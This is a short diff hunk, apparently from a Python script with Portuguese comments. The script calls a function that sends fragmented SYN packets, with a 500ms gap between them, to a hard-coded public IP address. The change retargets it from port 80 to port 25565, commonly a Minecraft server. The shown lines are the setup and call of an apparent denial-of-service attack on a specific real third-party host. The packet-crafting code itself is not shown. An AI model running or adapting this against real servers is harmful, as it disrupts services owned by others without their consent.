@@ -77,6 +77,6 @@ def enviar_fragmentos_syn(ip_destino, porta_destino, intervalo):
 
 # Parâmetros de teste
 ip_destino = "185.107.192.36"
-porta_destino = 80
+porta_destino = 25565
 intervalo = 0.5  # 500ms entre fragmentos para simular o atraso
 enviar_fragmentos_syn(ip_destino, porta_destino, intervalo)
